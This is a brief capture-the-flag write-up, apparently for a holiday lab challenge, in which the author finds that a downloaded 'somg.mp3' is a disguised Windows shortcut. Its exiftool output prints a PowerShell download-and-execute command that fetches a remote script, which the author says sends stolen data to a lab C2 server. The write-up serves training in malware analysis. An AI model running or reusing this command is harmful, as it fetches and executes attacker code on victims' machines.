# Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?


I go to `10.10.10.41` and see a youtube-link to .mp3 converter website, I paste the link (of one of my fav songs https://www.youtube.com/watch?v=LYU-8IFcDPw) and download the `.zip` file.


after unzipping the file, I see two file. `song.mp3` and `somg.mp3` after running `exiftool` on both I see that the `song.mp3` file's author is some guy named `Tyler Ramsbey` and for `somg.mp3` I see:-


```
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 12:44:14+05:30
Access Date                     : 2018:09:15 12:44:14+05:30
Modify Date                     : 2018:09:15 12:44:14+05:30
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Volume Label                    :
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
```


which reveals that `somg.mp3` is actually a powershell script. I visit the link `https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1` which sends "stolen info" to a a C2 server `http://papash3ll.thm/data`


Since, we already got the profile of the author of this script from the `raw.githubusercontent.com/` link I visit `https://github.com/MM-WarevilleTHM/` and I see a repo `IS` with 1 commit.


Seems like the Mayor of Wareville is upto some sus stuff.
